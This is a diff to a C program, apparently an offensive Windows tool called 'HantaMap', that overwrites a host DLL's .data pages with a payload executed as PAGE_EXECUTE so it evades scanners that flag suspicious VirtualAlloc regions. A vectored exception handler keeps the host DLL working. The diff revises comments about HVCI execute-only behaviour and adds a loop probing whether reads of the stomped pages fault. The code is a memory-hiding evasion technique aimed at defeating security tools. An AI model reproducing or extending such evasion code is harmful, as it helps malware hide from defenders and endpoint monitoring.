@@ -5,13 +5,13 @@
  * The payload executes from an address range belonging to the host module,
  * invisible to tools that flag suspicious VirtualAlloc regions.
  *
- * Hijacked pages are PAGE_EXECUTE. On non-HVCI systems this is equivalent
- * to PAGE_EXECUTE_READ (x64 PTEs can't separate execute from read). On
- * HVCI systems the EPT enforces true execute-only — scanners can't read.
+ * Hijacked pages are PAGE_EXECUTE. On x64 this is equivalent to
+ * PAGE_EXECUTE_READ at the PTE level (hardware can't separate execute
+ * from read). True execute-only would require custom EPT manipulation.
  *
- * A VEH proxies read/write faults to a backup buffer so the host DLL
- * stays functional. Only the payload's footprint is overwritten; the
- * rest of .data stays intact.
+ * A VEH proxies write faults to a backup buffer so the host DLL stays
+ * functional. Only the payload's footprint is overwritten; the rest of
+ * .data stays intact.
  *
  * 64-bit Windows only.
  */
@@ -250,10 +250,25 @@ int main(void)
     printf("[+] MessageBeep: ok\n");
     printf("[+] host DLL fully functional\n");
 
+    /* probe the stomped pages — on HVCI, PAGE_EXECUTE is truly execute-only
+     * so these reads fault and the VEH proxies them to the backup buffer.
+     * without HVCI, reads go through silently (PAGE_EXECUTE allows reads). */
+    LONG before = g_veh_count;
+    volatile BYTE probe = 0;
+    for (SIZE_T i = 0; i < payload_size && i < payload_aligned; i += 64)
+        probe ^= map_base[i];
+    (void)probe;
+    LONG after = g_veh_count;
+    printf("\n[*] read-probe of stomped pages: %ld VEH intercepts\n", (long)(after - before));
+    if (after > before)
+        printf("[+] reads faulted — VEH proxied them to backup\n");
+    else
+        printf("[*] reads passed through (x64 PAGE_EXECUTE = PAGE_EXECUTE_READ at PTE level)\n");
+
     printf("\n=== HantaMap active ===\n");
     printf("  %s .data at %p\n", victim, (void *)map_base);
     printf("  VEH intercepts: %ld\n", (long)g_veh_count);
-    printf("  PAGE_EXECUTE (HVCI = true execute-only)\n");
+    printf("  PAGE_EXECUTE\n");
     printf("\n[*] Enter to exit\n");
     getchar();
 
